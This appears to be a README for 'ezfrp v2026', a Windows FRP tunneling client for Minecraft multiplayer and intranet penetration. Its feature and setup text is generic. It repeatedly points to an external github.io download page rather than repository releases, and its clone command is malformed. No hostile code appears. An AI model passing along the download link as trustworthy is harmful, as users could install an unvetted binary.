# ezfrp v2026 - Windows FRP Tunneling for Minecraft

> **ezfrp is a Windows-based FRP tunneling client designed to simplify Minecraft multiplayer access with one-click configuration, predefined nodes, and the current 2026 release workflow.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/florianhayes6/ezfrp-windows-frp?style=flat-square)](https://github.com/florianhayes6/ezfrp-windows-frp)

---

<p align="center">
  <a href="https://florianhayes6.github.io/ezfrp-windows-frp/">
    <img src="https://img.shields.io/badge/Download-ezfrp%20Latest-brightgreen?style=for-the-badge" alt="Download ezfrp">
  </a>
</p>

> **[Download ezfrp v2026](https://florianhayes6.github.io/ezfrp-windows-frp/)**

---

[Download Latest Build](https://florianhayes6.github.io/ezfrp-windows-frp/)

---

## Overview

ezfrp provides a desktop interface for FRP tunneling on Windows, with an emphasis on intranet penetration and Minecraft connectivity. Its graphical client and preset-node workflow bring the main connection steps together in a single application.

The tool is intended for users who want a straightforward tunnel setup instead of configuring every component by hand. It supports dual-node service arrangements, token authentication, and both QUIC and TCP transport modes for local use as well as self-hosted deployments.

---

## Highlights

- Start FRP with a simplified one-click workflow
- Use a Windows desktop interface created with Tauri
- Configure services that use two-node routing
- Support Minecraft multiplayer connectivity and acceleration workflows
- Select between QUIC and TCP transport
- Work with preset nodes protected by tokens
- Deploy a server-side setup under your own control
- Handle intranet penetration and general tunneling scenarios

---

## Getting Started

Clone the project or obtain the latest build using the download link above.

1. Retrieve the source or packaged application:
   - `git clone https://github.com/florianhayes6/ezfrp-windows-frp.git
   - or select the download link provided above
2. After extraction or packaging, open the Windows client build.
3. When working from source, use the entry point defined by the repository layout to launch the desktop application.

---

## How to Use

A normal connection setup looks like this:

1. Start ezfrp on a Windows computer.
2. Choose a preset node or provide the node information manually.
3. Enter the token associated with the service.
4. Pick the required transport, including QUIC or TCP.
5. Start the tunnel, then connect Minecraft or another target service through the configured endpoint.

For a self-hosted arrangement, deploy the server-side FRP service before starting the client. The client configuration should correspond to the selected node and its token.

---

## Settings and Configuration

The Windows client is used for client-side configuration, while server deployment values are maintained in the server setup.

The main settings to verify include:

- Selected node
- Service token
- Transport protocol
- Endpoint information
- Dual-node routing configuration

If the installation uses local configuration files, place them in the working directory expected by the application. For a self-hosted setup, server-related files should remain with the deployed server components as appropriate.

---

## Requirements

- Windows
- A desktop runtime compatible with the Tauri client
- Access to an FRP-capable server or node
- Network connectivity for the chosen transport
- Enough storage for the client and any self-hosted server deployment files

---

## Frequently Asked Questions

**Is ezfrp limited to Minecraft?**  
Minecraft multiplayer connectivity and acceleration are central use cases, but ezfrp's underlying FRP workflow can also be used for intranet penetration.

**Must I run my own server?**  
A personal server is not required for every basic client scenario. The project also supports self-hosted server-side deployment when you want to operate your own setup.

**Which transport protocols can I choose?**  
ezfrp supports QUIC and TCP.

**Where are the configuration values changed?**  
Client-side values are primarily entered in the Windows application. Settings for the server side belong to your deployment configuration.

**How should I troubleshoot a failed connection?**  
Verify the node information, token, transport selection, and server deployment values. Confirm that both ends use matching settings before starting the tunnel again.

---

## License

GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the complete license text.
